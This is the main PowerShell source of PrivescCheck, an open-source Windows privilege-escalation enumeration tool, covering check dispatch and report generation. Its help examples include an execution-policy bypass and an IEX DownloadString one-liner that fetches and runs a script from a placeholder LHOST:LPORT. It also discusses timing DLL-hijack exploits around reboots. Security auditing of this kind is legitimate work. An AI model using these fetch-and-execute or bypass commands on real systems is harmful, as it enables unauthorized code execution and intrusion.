function Invoke-PrivescCheck {
    <#
    .SYNOPSIS
    Enumerates common security misconfigurations that can be exploited for privilege escalation purposes.

    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION
    This script aims to identify security misconfigurations that are relevant for privilege escalation. It also provides some additional information that may help penetration testers to choose between several potential exploits. For example, if you find that a service is vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know how often the machine is rebooted (in the case of a server). If you see that it is rebooted every night for instance, you may want to attempt an exploit.

    .PARAMETER Extended
    Set this flag to enable extended checks.

    .PARAMETER Audit
    Set this flag to enabled audit checks.

    .PARAMETER Experimental
    Set this flag to enable experimental checks.

    .PARAMETER Risky
    Set this flag to enable risky checks that could trigger an EDR detection.

    .PARAMETER Force
    Set this flag to ignore warnings.

    .PARAMETER Silent
    Don't output test results, show only the final vulnerability report.

    .PARAMETER Report
    The base name of the output file report(s) (extension is appended automatically depending on the chosen file format(s)).

    .PARAMETER Format
    A comma-separated list of file formats (TXT,HTML,CSV,XML).

    .EXAMPLE
    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck

    .EXAMPLE
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE
    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
    #>

    [CmdletBinding()]
    param(
        [Switch] $Extended = $false,
        [Switch] $Audit = $false,
        [Switch] $Risky = $false,
        [Switch] $Experimental = $false,
        [Switch] $Silent = $false,
        [Switch] $Stats = $false,
        [Switch] $Force = $false,

        # TODO: Replace with format set after deprecation
        [ValidateNotNullOrEmpty()]
        # [ValidateSet("TXT", "HTML", "CSV", "XML", "ALL")]
        [String[]] $Report,

        [ValidateNotNullOrEmpty()]
        [String] $FilePath,

        # TODO: Remove after deprecation
        [ValidateSet("TXT", "HTML", "CSV", "XML", "ALL")]
        [String[]] $Format
    )

    begin {

        $FileFormatsSupported = @("TXT", "HTML", "CSV", "XML")

        $WarningMessageSleepDuration = 0

        # ==============================================================================
        # Check whether the current process has admin privileges (check borrowed from
        # PowerUp.ps1).
        # ==============================================================================

        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if ($IsAdmin) {
            if (-not $Force) {
                Write-Warning "[MAIN] You are running this script as an administrator! Some checks will be automatically disabled."
                $WarningMessageSleepDuration += 10
            }
        }

        # ==============================================================================
        # Reset all the global variables and the cache before running the checks.
        # Initialize the global check result list.
        # ==============================================================================

        foreach ($VariableEntry in $($script:GlobalVariable.Keys)) {
            $script:GlobalVariable.$VariableEntry = $null
        }

        Clear-CachedData

        $script:GlobalVariable.CheckResultList = @()

        # ==============================================================================
        # Input parameter handling.
        # ==============================================================================

        $OutputReportFilePath = Get-ReportFilename
        $OutputReportFormats = @()

        if ($PSBoundParameters['Report']) {

            # TODO: Temporary check, refactor after deprecation
            if (($Report.Count -eq 1) -and ($FileFormatsSupported -notcontains $Report[0]) -and ($Report[0] -ne "ALL")) {
                Write-Warning "[MAIN] Option '-Report <FILEPATH>' is deprecated! Check out README for more information."
                # Replicate previous default behavior
                $OutputReportFilePath = $Report
                $OutputReportFormats = @("TXT")
                $WarningMessageSleepDuration += 5
            }
            else {
                if ($Report -contains "ALL") {
                    $OutputReportFormats = $FileFormatsSupported
                }
                else {
                    # TODO: This check won't be necessary when 'Report' is replaced by a "validated set"
                    $FileFormatsSpecified = @()
                    $Report | ForEach-Object {
                        if ($FileFormatsSupported -contains $_) {
                            $FileFormatsSpecified += $_
                        }
                        else {
                            throw "[MAIN] Unknown file format: $($_)"
                        }
                    }
                    $FileFormatsSpecified = [String[]] ($FileFormatsSpecified | Sort-Object -Unique)
                    if ($FileFormatsSpecified.Count -eq $FileFormatsSupported.Count) {
                        Write-Warning "[MAIN] Use alias 'ALL' to specify all file formats."
                        $WarningMessageSleepDuration += 5
                    }
                    $OutputReportFormats = $FileFormatsSpecified
                }
            }
        }

        if ($PSBoundParameters['FilePath']) {
            if ([IO.Directory]::Exists($FilePath)) {
                $OutputReportFilePath = Join-Path -Path $FilePath -ChildPath $OutputReportFilePath
            }
            else {
                $OutputReportFilePath = $FilePath
            }
        }

        # TODO: Remove after deprecation
        if ($PSBoundParameters['Format']) {
            Write-Warning "[MAIN] Option '-Format' is deprecated! Check out README for more information."
            $Format = $Format | Sort-Object -Unique
            if ($Format -contains "ALL") {
                $OutputReportFormats = @("TXT", "HTML", "CSV", "XML")
            }
            else {
                # Replicate previous default behavior
                $Format | ForEach-Object {
                    if ($FileFormatsSupported -notcontains $_) {
                        throw "[MAIN] Unknown file format: $($_)"
                    }
                    $OutputReportFormats += $Format
                }
            }
        }
    }

    process {

        if (($WarningMessageSleepDuration -gt 0) -and (-not $PSBoundParameters['Force'])) {
            Write-Warning "[MAIN] Use option '-Force' to ignore warning messages and run immediately."
            $WarningMessageSleepDuration += 5
            Start-Sleep -Seconds $WarningMessageSleepDuration
        }

        $CheckList = Get-CheckList

        foreach ($Check in $CheckList) {

            # ==============================================================================
            # Determine whether this check should be run based on the parameters supplied by
            # the user. By default, we consider that the check should not be executed.
            # ==============================================================================

            $IgnoreCheck = $true

            switch ($Check.Type) {
                "Base"         { $IgnoreCheck = $false }
                "Extended"     { if ($PSBoundParameters['Extended'])     { $IgnoreCheck = $false } }
                "Audit"        { if ($PSBoundParameters['Audit'])        { $IgnoreCheck = $false } }
                "Experimental" { if ($PSBoundParameters['Experimental']) { $IgnoreCheck = $false } }
                default {
                    throw "[MAIN] Check type '$($Check.Type)' is unknown (ID=$($Check.Id))."
                }
            }

            # ==============================================================================
            # If we have determined that the check should not be run based on the user-
            # supplied options, move on to the next one. Otherwise, we now consider that the
            # check should be run by default.
            # ==============================================================================

            if ($IgnoreCheck) { continue } else { $IgnoreCheck = $false }

            # ==============================================================================
            # If the current process is running with administrator privileges, we want to
            # make sure that the check's 'RunIfAdmin' property is set to true.
            # ==============================================================================

            if ($IsAdmin -and (-not [Convert]::ToBoolean($Check.RunIfAdmin))) {
                Write-Warning "[MAIN] Check '$($Check.DisplayName)' won't give proper results when run as an administrator, ignoring..."
                $IgnoreCheck = $true
            }

            # ==============================================================================
            # If the current check is identified as 'Risky', we want to make sure that the
            # user used '-Risky' option, otherwise we won't execute it.
            # ==============================================================================

            if ([Convert]::ToBoolean($Check.Risky) -and (-not $Risky)) {
                Write-Warning "[MAIN] Check '$($Check.DisplayName)' is categorized as risky, but the option '-Risky' was not specified, ignoring..."
                $IgnoreCheck = $true
            }

            # ==============================================================================
            # If we have determined that the check should not be executed, move on to the
            # next one. Otherwise, execute it.
            # ==============================================================================

            if ($IgnoreCheck) { continue }

            Invoke-Check -Id $Check.Id -List $CheckList -Silent:$Silent
        }

        # ==============================================================================
        # All the checks have been executed. We can now print a short report summarizing
        # the findings and their severity level.
        # ==============================================================================

        if (-not $PSBoundParameters['Silent']) {
            Write-ShortReport -AllResults $script:GlobalVariable.CheckResultList
        }

        # ==============================================================================
        # If the '-Report' option was used, generate report files. If no explicit format
        # was specified, assume 'TXT' by default.
        # ==============================================================================

        $OutputReportFormats | ForEach-Object {

            # ==============================================================================
            # For each format, build the name of the output report file as BASENAME||.||EXT.
            # Then, generate the report corresponding to the current format and write the
            # output to a file using the previously formatted filename or file path.
            # ==============================================================================

            $Ext = $_.ToLower()

            switch ($_) {
                "TXT"  { Write-TxtReportOutput  -AllResults $script:GlobalVariable.CheckResultList | Out-File "$($OutputReportFilePath).$($Ext)" -Encoding unicode }
                "HTML" { Write-HtmlReportOutput -AllResults $script:GlobalVariable.CheckResultList | Out-File "$($OutputReportFilePath).$($Ext)" -Encoding unicode }
                "CSV"  { Write-CsvReportOutput  -AllResults $script:GlobalVariable.CheckResultList | Out-File "$($OutputReportFilePath).$($Ext)" -Encoding unicode }
                "XML"  { Write-XmlReportOutput  -AllResults $script:GlobalVariable.CheckResultList | Out-File "$($OutputReportFilePath).$($Ext)" -Encoding unicode }
                default {
                    throw "[MAIN] Report output file format '$($_.ToUpper())' is unknown."
                }
            }
        }

        # ==============================================================================
        # Generate a CSV file containing the execution time of each check. The goal is
        # to have have data that can later be used to know which check to improve in
        # priority, performance-wise.
        # ==============================================================================

        if ($PSBoundParameters['Stats']) {

            $AllStats = @()

            $script:GlobalVariable.CheckResultList | ForEach-Object {
                $Stat = New-Object -TypeName PSObject
                $Stat | Add-Member -MemberType "NoteProperty" -Name "Id" -Value $_.Id
                $Stat | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $_.Command
                $Stat | Add-Member -MemberType "NoteProperty" -Name "TimeElapsed" -Value $_.TimeElapsed
                $AllStats += $Stat
            }

            $AllStats | Export-Csv -Path "$(Get-ReportFilename)_stats.csv" -NoTypeInformation -Encoding unicode
        }
    }
}

function Get-CheckList {

    [OutputType([Object[]])]
    [CmdletBinding()]
    param ()

    process {
        if (-not (Test-CachedData -Name "CheckList")) {

            $CheckList = [Object[]] (ConvertFrom-EmbeddedTextBlob -TextBlob $script:GlobalConstant.Checks | ConvertFrom-Csv)

            Set-CachedData -Name "CheckList" -Data $CheckList
        }

        Get-CachedData -Name "CheckList"
    }
}

function Invoke-DynamicCommand {

    [CmdletBinding()]
    param(
        [String] $Command
    )

    process {
        $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Command)
        . $ScriptBlock
    }
}

function Invoke-Check {

    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [String] $Id,

        [Object[]] $List,

        [Switch] $Silent = $false
    )

    begin {
        $CheckId = $Id

        # ==============================================================================
        # If the check list is not passed as an input parameters, retrieve it from the
        # cache.
        # ==============================================================================

        if ($null -eq $List) {
            $CheckList = Get-CheckList
        }
        else {
            $CheckList = $List
        }

        # ==============================================================================
        # Create a StopWatch object to measure the time taken by each check.
        # ==============================================================================

        $StopWatch = [Diagnostics.StopWatch]::StartNew()
        $StopWatch.Stop()
    }

    process {
        if ($null -eq $CheckList) {
            throw "[MAIN] CHeck list is null or empty."
        }

        # ==============================================================================
        # Retrieve the Check object with provided ID from the cached check list.
        # ==============================================================================

        $Check = $CheckList | Where-Object { $_.Id -eq $CheckId }

        if ($null -eq $CheckId) {
            throw "[MAIN] Check ID '$($CheckId)' was not found in the check list."
        }

        # ==============================================================================
        # Don't show the check's banned if the Silent option is used.
        # ==============================================================================

        if (-not $Silent) { Write-CheckBannerOutput -Check $Check }

        # ==============================================================================
        # Set the check's base severity level according to the check's "Severity"
        # property.
        # ==============================================================================

        $Check | Add-Member -MemberType "NoteProperty" -Name "BaseSeverity" -Value $($Check.Severity -as $script:SeverityLevel)

        # ==============================================================================
        # Reset and start the StopWatch.
        # ==============================================================================

        $StopWatch.Reset()
        $StopWatch.Start()

        # ==============================================================================
        # Run the check and format the check's output.
        # ==============================================================================

        $CheckResult = Invoke-DynamicCommand -Command "$($Check.Command) -BaseSeverity $([UInt32] $Check.BaseSeverity)"
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $CheckResult.Result
        $Check.Severity = $CheckResult.Severity -as $script:SeverityLevel

        if ($Check.Format -eq "Table") {
            $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Check.ResultRaw | Format-Table | Out-String)
        }
        elseif ($Check.Format -eq "List") {
            $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Check.ResultRaw | Format-List | Out-String)
        }

        # ==============================================================================
        # Stop the StopWatch and add the elapsed time object as a new property to the
        # check result.
        # ==============================================================================

        $StopWatch.Stop()
        $Check | Add-Member -MemberType "NoteProperty" -Name "TimeElapsed" -Value $StopWatch.Elapsed

        # ==============================================================================
        # Show the check's output, unless the "Silent" option was used.
        # ==============================================================================

        if ($Silent) {
            Write-CheckResultShort -Check $Check
        }
        else {
            Write-CheckResult -Check $Check
        }

        $script:GlobalVariable.CheckResultList += $Check
    }
}

function ConvertFrom-EmbeddedTextBlob {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String] $TextBlob
    )

    process {
        $Decoded = [Convert]::FromBase64String($TextBlob)
        ConvertFrom-Gzip -InputBuffer $Decoded
    }
}

function Get-ReportFilename {

    [OutputType([String])]
    [CmdletBinding()]
    param ()

    process {
        $ComputerName = $env:COMPUTERNAME
        if ([String]::IsNullOrEmpty($ComputerName)) { $ComputerName = "UNKNOWN" }
        $CurrentDateTime = (Get-Date).ToString("yyyyMMddHHmmss")
        return "PrivescCheck_$($ComputerName)_$($CurrentDateTime)"
    }
}

function Get-SeverityColor {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [UInt32] $Severity
    )

    process {
        $SeverityLevel = $Severity -as $script:SeverityLevel
        switch ($SeverityLevel) {
            $script:SeverityLevel::Low    { "DarkCyan" }
            $script:SeverityLevel::Medium { "DarkYellow" }
            $script:SeverityLevel::High   { "Red" }
            default {
                throw "[MAIN] Severity level '$($SeverityLevel)' is unknown."
            }
        }
    }
}

function Write-CheckBannerOutput {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object] $Check,

        [Switch] $Ascii
    )

    function Split-Description {

        param(
            [String] $Description
        )

        $DescriptionSplit = [String[]] @()
        $TempOld = ""
        $TempNew = ""
        $Description.Split(' ') | ForEach-Object {

            $TempNew = "$($TempOld) $($_)".Trim()
            if ($TempNew.Length -gt 60) {
                $DescriptionSplit += $TempOld
                $TempOld = "$($_)"
            }
            else {
                $TempOld = $TempNew
            }
        }
        if ($TempOld) {
            $DescriptionSplit += $TempOld
        }

        $DescriptionSplit
    }

    $HeavyVertical = [char] $(if ($Ascii) { 0x007C } else { 0x2503 })
    $HeavyHorizontal = [char] $(if ($Ascii) { 0x002D } else { 0x2501 })
    $HeavyVerticalAndRight = [char] $(if ($Ascii) { 0x002B } else { 0x2523 })
    $HeavyVerticalAndLeft = [char] $(if ($Ascii) { 0x002B } else { 0x252B })
    $HeavyDownAndHorizontal = [char] $(if ($Ascii) { 0x002B } else { 0x2533 })
    $HeavyUpAndHorizontal = [char] $(if ($Ascii) { 0x002B } else { 0x253B })
    $HeavyDownAndLeft = [char] $(if ($Ascii) { 0x002B } else { 0x2513 })
    $HeavyDownAndRight = [char] $(if ($Ascii) { 0x002B } else { 0x250F })
    $HeavyUpAndRight = [char] $(if ($Ascii) { 0x002B } else { 0x2517 })
    $HeavyUpAndLeft = [char] $(if ($Ascii) { 0x002B } else { 0x251B })

    $Result = ""
    $Result += "$($HeavyDownAndRight)$("$HeavyHorizontal" * 10)$($HeavyDownAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyDownAndLeft)`n"
    $Result += "$($HeavyVertical) CATEGORY $($HeavyVertical) $($Check.Category)$(' ' * (49 - $Check.Category.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVertical) NAME     $($HeavyVertical) $($Check.DisplayName)$(' ' * (49 - $Check.DisplayName.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVertical) TYPE     $($HeavyVertical) $($Check.Type)$(' ' * (49 - $Check.Type.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVerticalAndRight)$("$HeavyHorizontal" * 10)$($HeavyUpAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyVerticalAndLeft)`n"
    Split-Description -Description $Check.Description | ForEach-Object {
        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String] $_).Length)) $($HeavyVertical)`n"
    }
    $Result += "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
    $Result
}

function Write-CheckResultShort {

    [OutputType([String])]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object] $Check
    )

    process {
        $Severity = $(if ($Check.Severity) { $Check.Severity } else { $script:SeverityLevel::None }) -as $script:SeverityLevel
        "[CATEGORY=$($Check.Category.ToUpper())][TEST=$($Check.DisplayName)][SEVERITY=$($Severity)][TIME=$($Check.TimeElapsed.ToString("hh\:mm\:ss\.fff"))]"
    }
}

function Write-CheckResult {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object] $Check
    )

    begin {
        $ResultOutput = ""
        $IsVulnerabilityCheck = $Check.BaseSeverity -ne $script:SeverityLevel::None
        $Severity = $(if ($Check.Severity) { $Check.Severity } else { $script:SeverityLevel::None }) -as $script:SeverityLevel
    }

    process {
        # Show the raw output of the check first.
        switch ($Check.Format) {
            "Table" { $ResultOutput += $Check.ResultRaw | Format-Table -AutoSize | Out-String }
            "List" { $ResultOutput += $Check.ResultRaw | Format-List | Out-String }
            default {
                throw "[MAIN] Check output format '$($Check.Format)' is unknown (ID=$($Check.Id))."
            }
        }

        # Then show a status message.
        $ResultOutput += "[*] Status:"

        if ($Severity -eq $script:SeverityLevel::None) {
            $ResultOutput += " Informational"
            if ($IsVulnerabilityCheck) {
                $ResultOutput += " (not vulnerable)"
            }
            else {
                if (-not $Check.ResultRaw) {
                    $ResultOutput += " (nothing found)"
                }
            }
        }
        else {
            $ResultOutput += " Vulnerable"
        }

        $ResultOutput += " - Severity: $($Severity) - Execution time: $($Check.TimeElapsed.ToString("hh\:mm\:ss\.fff"))"
        $ResultOutput += "`n`n"

        $ResultOutput
    }
}

function Write-TxtReportOutput {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object[]] $AllResults
    )

    $AllResults | ForEach-Object {
        Write-CheckBannerOutput -Check $_ -Ascii
        Write-CheckResult -Check $_
    }
}

function Write-CsvReportOutput {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object[]] $AllResults
    )

    $AllResults | Sort-Object -Property "Category", "DisplayName" | Select-Object Id, Category, DisplayName, Description, Severity, ResultRawString | ConvertTo-Csv -NoTypeInformation
}

function Write-XmlReportOutput {
    <#
    .NOTES
    According to the XML specification, some characters are invalid. The raw result of a check ("ResultRawString") may contain such characters. Therefore, this result must be sanitized before calling "ConvertTo-Xml". The method used here was taken from a solution that was posted on StackOverflow.

    .LINK
    https://github.com/itm4n/PrivescCheck/issues/24
    https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
    #>

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object[]] $AllResults
    )

    $AuthorizedXmlCharactersRegex = "[^\x09\x0A\x0D\x20-\xD7FF\xE000-\xFFFD\x10000\x10FFFF]"
    $AllResults | ForEach-Object {
        $_.ResultRawString = [Text.RegularExpressions.Regex]::Replace($_.ResultRawString, $AuthorizedXmlCharactersRegex, "")
        $_
    } | Sort-Object -Property "Category", "DisplayName" | Select-Object Id, Category, DisplayName, Description, Severity, ResultRawString | ConvertTo-Xml -As String
}

function Write-HtmlReportOutput {

    [OutputType([String])]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object[]] $AllResults
    )

    $JavaScript = @"
const svgSortIcon = ``<svg viewBox="0 0 16 16" fill="none"
xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier"
stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round"
stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M8 0L2
6V7H14V6L8 0Z" fill="#ffffff"></path> <path d="M8 16L2 10V9H14V10L8 16Z"
fill="#ffffff"></path> </g></svg>``;
// Sort icon by Noah Jacobus: https://www.svgrepo.com/svg/535650/sort
const svgFilterIcon = ``<svg viewBox="0 0 24 24" fill="none"
xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier"
stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round"
stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path
fill-rule="evenodd" clip-rule="evenodd" d="M4.2673 6.24223C2.20553 4.40955
3.50184 1 6.26039 1H17.7396C20.4981 1 21.7945 4.40955 19.7327 6.24223L15.3356
10.1507C15.1221 10.3405 15 10.6125 15 10.8981V21.0858C15 22.8676 12.8457
23.7599 11.5858 22.5L9.58578 20.5C9.21071 20.1249 8.99999 19.6162 8.99999
19.0858V10.8981C8.99999 10.6125 8.87785 10.3405 8.66436 10.1507L4.2673
6.24223ZM6.26039 3C5.34088 3 4.90877 4.13652 5.59603 4.74741L9.99309
8.6559C10.6336 9.22521 11 10.0412 11 10.8981V19.0858L13 21.0858V10.8981C13
10.0412 13.3664 9.22521 14.0069 8.6559L18.404 4.74741C19.0912 4.13652 18.6591 3
17.7396 3H6.26039Z" fill="#FFFFFF"></path> </g></svg>``;
// Filter Icon by Konstantin Filatov: https://www.svgrepo.com/svg/521661/filter
var cells = document.getElementsByTagName('td');

for (var i = 0; i < cells.length; i++) {
    var bg_color = null;
    var bg_color_row = null;
    let severity = null;
    if (cells[i].innerHTML == "Low") {
        bg_color = "bg_blue";
        bg_color_row = "bg_blue_light";
        severity = 1;
    } else if (cells[i].innerHTML == "Medium") {
        bg_color = "bg_orange";
        bg_color_row = "bg_orange_light";
        severity = 2;
    } else if (cells[i].innerHTML == "High") {
        bg_color = "bg_red";
        bg_color_row = "bg_red_light";
        severity = 3;
    } else if (cells[i].innerHTML == "None") {
        bg_color = "bg_grey";
        bg_color_row = "bg_grey_light";
        severity = 0;
    }

    if (bg_color) {
        if (bg_color_row) { cells[i].parentElement.classList.add(bg_color_row); }
        cells[i].innerHTML = "<span class=\"label " + bg_color + "\">" + cells[i].innerHTML + "</span>";
        cells[i].dataset.severity = severity;
    }

    // If a cell is too large, we need to make it scrollable. But 'td' elements are not
    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
    // it scrollable.
    cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
}


function sortTable(columnIndex) {
    const table = document.getElementsByTagName("table")[0];
    const tbody = table.querySelector("tbody");
    const rows = Array.from(tbody.querySelectorAll("tr")).slice(1);
    const isAscending = table.dataset.sortOrder === "asc";

    rows.sort((rowA, rowB) => {
        const cellA = rowA.cells[columnIndex].dataset.severity || rowA.cells[columnIndex].textContent.trim();
        const cellB = rowB.cells[columnIndex].dataset.severity || rowB.cells[columnIndex].textContent.trim();

        return isAscending ? cellA.localeCompare(cellB) : cellB.localeCompare(cellA);
    });

    for (const row of rows) {
        row.remove();
    }

    tbody.append(...rows);

    table.dataset.sortOrder = isAscending ? "desc" : "asc";
}


function createPopupMenu(button, options) {
    if (!button) return;

    const popup = document.createElement("div");
    popup.style.position = "absolute";
    popup.style.background = "white";
    popup.style.border = "1px solid #ccc";
    popup.style.padding = "10px";
    popup.style.boxShadow = "0 2px 10px rgba(0,0,0,0.2)";
    popup.style.display = "none";
    popup.style.zIndex = "1000";
    popup.style.borderRadius = "5px";
    popup.style["font-size"] = "0.8em";

    options.forEach(option => {
        const label = document.createElement("label");
        const checkbox = document.createElement("input");
        checkbox.type = "checkbox";
        checkbox.value = option.value;
        checkbox.checked = option.checked || false;
        label.appendChild(checkbox);
        label.appendChild(document.createTextNode(" " + option.label));
        popup.appendChild(label);
        popup.appendChild(document.createElement("br"));
    });

    const btnOk = document.createElement("button");
    btnOk.textContent = "OK";
    btnOk.style.marginRight = "5px";
    btnOk.style.marginTop = "3px";
    btnOk.onclick = () => {
        const selected = Array.from(popup.querySelectorAll("input[type=checkbox]"))
            .filter(cb => cb.checked)
            .map(cb => cb.value);
        for (const row of document.getElementsByTagName("tr")) {
            const severity = row.querySelector("span.label")?.closest("td").dataset.severity;
            row.style.display = (selected.includes(severity) || (!severity)) ? "" : "none";
        };
        popup.style.display = "none";
    };

    const btnCancel = document.createElement("button");
    btnCancel.textContent = "Cancel";
    btnCancel.onclick = () => {
        popup.style.display = "none";
    };

    popup.appendChild(btnOk);
    popup.appendChild(btnCancel);
    document.body.appendChild(popup);

    button.addEventListener("click", (event) => {
        const rect = button.getBoundingClientRect();
        popup.style.top = ```${rect.bottom + window.scrollY}px``;
        popup.style.left = ```${rect.left + window.scrollX}px``;
        popup.style.display = popup.style.display === "none" ? "block" : "none";
    });
}

// Add tool icons to column headers
const headerCells = document.querySelectorAll('th');
for (const [idx, cell] of headerCells.entries()) {
    // Add sort button on columns category, DisplayName and Severity
    if ([0,1,3].includes(idx)) {
        const sortButton = document.createElement("a");
        sortButton.href = '#';
        sortButton.title = "Sort";
        sortButton.innerHTML = svgSortIcon;
        sortButton.classList.add("tool-button");

        sortButton.addEventListener("click", (e) => sortTable(idx));

        cell.append(" ");
        cell.append(sortButton);
    }

    // Add filter button on severity column
    if (idx === 3) {
        const filterButton = document.createElement("a");
        filterButton.href = '#';
        filterButton.title = "Filter";
        filterButton.innerHTML = svgFilterIcon;
        createPopupMenu(filterButton, [
            { label: "None", value: 0, checked: true },
            { label: "Low", value: 1, checked: true },
            { label: "Medium", value: 2, checked: true },
            { label: "High", value: 3, checked: true },
        ]);
        cell.append(" ");
        cell.append(filterButton);
    }

}

"@

    $Css = @"
body {
    font: 1.2em normal Arial,sans-serif;
}

table {
    border-collapse: collapse;
    width: 100%;
}

th {
    color: white;
    background: grey;
    text-align: center;
    padding: 5px 0;
    white-space: nowrap;
}

tr {
    border: 6px solid white;
}

td {
    text-align: center;
    padding: 5px 5px 5px 5px;
    max-width: 800px;
}

tbody td:nth-child(3) {
    text-align: left;
}

/* Render output results with 'pre' style */
tbody td:nth-child(5) {
    white-space: pre;
    margin: 1em 0px;
    padding: .2rem .4rem;
    font-size: 87.5%;
    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
    text-align: left;
}

.scroll {
    max-height: 200px;
    max-width: 800px;
    overflow: auto;
}

.label {
    color: white;
    margin: 8px;
    padding: 6px;
    display: block;
    width: 60px;
    border-radius: 4px;
    font-weight: bold;
}

a svg { height: 1em; color: white; }

.bg_green { background-color: green; }
.bg_blue { background-color: royalblue; }
.bg_orange { background-color: orange; }
.bg_red { background-color: red; }
.bg_grey { background-color: grey; }
.bg_blue_light { background-color: #eaf7ff; }
.bg_orange_light { background-color: #fff7ea; }
.bg_red_light { background-color: #ffeaea; }
.bg_grey_light { background-color: #f8f8f8; }
"@

    $Html = @"
<html lang="en-US">
<title>PrivescCheck Report</title>
<head>
<style>
$($Css)
</style>
</head>
<body>
BODY_TO_REPLACE
<script>
$($JavaScript)
</script>
</body>
</html>
"@

    $TableHtml = $AllResults | Sort-Object -Property "Category", "DisplayName" | ConvertTo-Html -Property "Category", "DisplayName", "Description", "Severity", "ResultRawString" -Fragment
    $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
    $Html
}

function Write-ShortReport {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Object[]] $AllResults
    )

    $HeavyVertical = [char] 0x2503
    # $HeavyVerticalAndRight = [char] 0x2523
    # $HeavyVerticalAndLeft = [char] 0x252B
    $HeavyHorizontal = [char] 0x2501
    # $HeavyDownAndHorizontal = [char] 0x2533
    # $HeavyUpAndHorizontal = [char] 0x253B
    $HeavyDownAndLeft = [char] 0x2513
    $HeavyDownAndRight = [char] 0x250F
    $HeavyUpAndRight = [char] 0x2517
    $HeavyUpAndLeft = [char] 0x251B
    $RightwardsArrow = [char] 0x2192

    $HeavyVerticalAndRight = [char] 0x2523
    $HeavyVerticalAndLeft = [char] 0x2528

    # Show only vulnerabilities, i.e. any finding that has a final severity of at
    # least "low".
    $AllVulnerabilities = [Object[]] ($AllResults | Where-Object { $_.Severity -ne $script:SeverityLevel::None })
    $Categories = $AllVulnerabilities | Select-Object -ExpandProperty "Category" | Sort-Object -Unique

    Write-Host -ForegroundColor White "$($HeavyDownAndRight)$("$($HeavyHorizontal)" * 62)$($HeavyDownAndLeft)"
    Write-Host -ForegroundColor White "$($HeavyVertical)$(" " * 17)~~~ PrivescCheck Summary ~~~$(" " * 17)$($HeavyVertical)"
    Write-Host -ForegroundColor White "$($HeavyVerticalAndRight)$("$($HeavyHorizontal)" * 62)$($HeavyVerticalAndLeft)"

    $TotalExecutionTime = [TimeSpan] 0
    $AllVulnerabilities | ForEach-Object { $TotalExecutionTime += $_.TimeElapsed }

    $TotalCheckString = "Total number of checks: $($AllResults.Count)"
    $TotalFindingString = "Total number of findings: $($AllVulnerabilities.Count)"
    $TotalExecutionTimeString = "Total execution time: $($TotalExecutionTime.ToString("hh\:mm\:ss\.fff"))"

    Write-Host "$($HeavyVertical) $($TotalCheckString) $(" " * (62 - $TotalCheckString.Length - 2))$($HeavyVertical)"
    Write-Host "$($HeavyVertical) $($TotalFindingString) $(" " * (62 - $TotalFindingString.Length - 2))$($HeavyVertical)"
    Write-Host "$($HeavyVertical) $($TotalExecutionTimeString) $(" " * (62 - $TotalExecutionTimeString.Length - 2))$($HeavyVertical)"

    foreach ($Category in $Categories) {

        $Vulnerabilities = $AllVulnerabilities | Where-Object { $_.Category -eq $Category } | Sort-Object -Property "DisplayName"

        Write-Host -ForegroundColor White "$($HeavyVerticalAndRight)$("$($HeavyHorizontal)" * 62)$($HeavyVerticalAndLeft)"
        Write-Host -ForegroundColor White "$($HeavyVertical) $($Category) $(" " * (62 - $Category.Length - 2))$($HeavyVertical)"
